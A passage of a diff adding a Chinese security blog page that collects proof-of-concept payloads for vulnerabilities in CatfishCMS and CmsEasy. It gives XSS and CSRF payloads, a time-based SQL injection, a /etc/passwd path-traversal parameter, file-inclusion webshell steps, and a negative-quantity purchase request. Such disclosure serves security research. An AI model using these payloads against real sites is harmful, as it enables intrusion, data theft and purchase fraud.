+        <span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostname'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>; port=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostport'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>; dbname=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>; charset=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'charset'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
+        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$psw</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">,</span><span class="token variable">$psw</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE from catfish_posts WHERE post_title LIKE '%xss_csrf_getshll%'"</span><span class="token punctuation">;</span>
+        <span class="token variable">$sql_1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE from catfish_comments WHERE content LIKE '%xss_csrf_getshll%'"</span><span class="token punctuation">;</span>
+        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getshell_code.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS-4-6-15-前台xss"><a href="#CatfishCMS-4-6-15-前台xss" class="headerlink" title="CatfishCMS 4.6.15 前台xss"></a>CatfishCMS 4.6.15 前台xss</h2><p>相关文件：</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Common.php</p>
+<p>poc：</p>
+<p>注册用户，在提交评论处修改请求体</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">pinglun</span><span class="token punctuation">:</span> <span class="token header-value">&lt;img src=# onerror='alert(1)'></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS-4-6-15-后台文件包含getshell"><a href="#CatfishCMS-4-6-15-后台文件包含getshell" class="headerlink" title="CatfishCMS 4.6.15 后台文件包含getshell"></a>CatfishCMS 4.6.15 后台文件包含getshell</h2><p>相关文件：</p>
+<p>CatfishCMS-4.6.12&#x2F;application&#x2F;admin&#x2F;controller&#x2F;Index.php</p>
+<p>poc：</p>
+<p>上传二次渲染图片马</p>
+<p>上传的触发点</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">CatfishCMS-4.6.12/index.php/admin/Index/newpage.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS后台csrf"><a href="#CatfishCMS后台csrf" class="headerlink" title="CatfishCMS后台csrf"></a>CatfishCMS后台csrf</h2><p>先登录后台</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://0-sec.org/index.php/admin/index/modifymanage.html?c=73<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uid<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>73<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>juese<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>verification<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>05f176843c20e12c1364e80b9869ac17<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS后台储存型xss"><a href="#CatfishCMS后台储存型xss" class="headerlink" title="CatfishCMS后台储存型xss"></a>CatfishCMS后台储存型xss</h2><p>网站背景中的管理员可以发布包含存储XSS漏洞的文章 提交标题以抓取数据包 使用burp修改参数 浏览文章可以触发XSS</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">neiron<span class="token operator">=</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="CmsEasy"><a href="#CmsEasy" class="headerlink" title="CmsEasy"></a>CmsEasy</h1><h2 id="CmsEasy-7-3-8-sql注入漏洞"><a href="#CmsEasy-7-3-8-sql注入漏洞" class="headerlink" title="CmsEasy 7.3.8 sql注入漏洞"></a>CmsEasy 7.3.8 sql注入漏洞</h2><p>相关文件：</p>
+<p>lib&#x2F;admin&#x2F;language_admin.php</p>
+<p>poc：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>BENCHMARK<span class="token punctuation">(</span><span class="token number">5000000</span><span class="token punctuation">,</span>md5<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CmsEasy-7-3-8-任意文件操作"><a href="#CmsEasy-7-3-8-任意文件操作" class="headerlink" title="CmsEasy 7.3.8 任意文件操作"></a>CmsEasy 7.3.8 任意文件操作</h2><p>观察模板编辑功能，存在对模板的html文件的读取操作，对应到HTTP请求可以明显看到可控参数</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">tplname=/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CmsEasy-7-3-8-本地文件包含漏洞"><a href="#CmsEasy-7-3-8-本地文件包含漏洞" class="headerlink" title="CmsEasy 7.3.8 本地文件包含漏洞"></a>CmsEasy 7.3.8 本地文件包含漏洞</h2><p>CmsEasy V7.3.8框架后端的语言编辑功能函数接口对include的文件路径没有做安全性校验，攻击者可以通过该接口包含上传的带有PHP代码内容的任意后缀（合法）文件，导致远程代码执行</p>
+<p>相关：</p>
+<p>CmsEasy_7.3.8_UTF-8_20191230&#x2F;lib&#x2F;admin&#x2F;language_admin.php的edit_action函数</p>
+<p>CmsEasy对于任何用户存在文件和图片上传功能，虽然我们不能直接上传php文件（默认禁止），但是可以上传内容为php代码的图片后缀文件，因此可以通过这一处文件包含达到最后高危的命令执行问题</p>
+<hr>
+<h2 id="CmsEasy-7-6-3-2-20200422-逻辑漏洞"><a href="#CmsEasy-7-6-3-2-20200422-逻辑漏洞" class="headerlink" title="CmsEasy 7.6.3.2_20200422 逻辑漏洞"></a>CmsEasy 7.6.3.2_20200422 逻辑漏洞</h2><ul>
+<li>1.登录任意账号</li>
+<li>2.点击任意产品</li>
+<li>3.点开任意一个产品，前提是有余量</li>
+<li>4.输入任意正常数量，burp开启抓包，点击添加到购物车</li>
+<li>5.将抓到的包中的最后一个数字改为负数，然后放包</li>
+</ul>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php?case=archive&amp;act=doorders&amp;aid=527&amp;datatype=&amp;thisnum=-100</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.0-sec.org</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
+<span class="token header"><span class="token header-name keyword">X-Requested-With</span><span class="token punctuation">:</span> <span class="token header-value">XMLHttpRequest</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0</span></span>
+<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost/index.php?case=archive&amp;act=show&amp;aid=527</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=5j671r8cg9kfppbkpl7i0n1te0; loginfalse=0; login_username=admin; login_password=787cc8f99d30dc9cbeeadd77f99efb84; ce_orders_cookie=TL%2BA8RODL9PeNwoN</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>6.此时可以看到购物车中为负数</li>
+<li>7.查看个人中心中的余额，为5600</li>
+<li>8.点击购物车</li>
+<li>9.点击下图内容</li>
+<li>10.填写完成之后，点击在线支付</li>
+<li>11.选择余额支付，点击购买</li>
+<li>12.购买成功 图片 13.png</li>
+<li>13.回到个人中心，可以看到余额的变化</li>
+</ul>
+<hr>
+<h1 id="Dedecms"><a href="#Dedecms" class="headerlink" title="Dedecms"></a>Dedecms</h1><hr>
+<h1 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h1><hr>
+<h1 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h1><hr>
+<h1 id="Drupal"><a href="#Drupal" class="headerlink" title="Drupal"></a>Drupal</h1><hr>
+<h1 id="ECShop"><a href="#ECShop" class="headerlink" title="ECShop"></a>ECShop</h1><hr>
+<h1 id="EmpireCMS"><a href="#EmpireCMS" class="headerlink" title="EmpireCMS"></a>EmpireCMS</h1><hr>
+<h1 id="Eyoucms"><a href="#Eyoucms" class="headerlink" title="Eyoucms"></a>Eyoucms</h1><hr>
+<h1 id="FastAdmin"><a href="#FastAdmin" class="headerlink" title="FastAdmin"></a>FastAdmin</h1>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
+         
+        
+    <div id="vcomments"></div>
+    
+        <script src="/blog/js/lib/valine.min.js"></script>
+            <script>
+                new Valine({
+                    el: '#vcomments',
+                    app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+                    app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+                    visitor: 'true',
+                    placeholder: '写点什么吧(●ˇ∀ˇ●)',
+                    serverURLs: 'https://u9mzlkun.lc-cn-e1-shared.com',
+                });
+            </script>
+
+        <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+            <span id="busuanzi_container_site_uv"> 
+                本站访客数<span id="busuanzi_value_site_uv"></span>人次
+            </span>
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
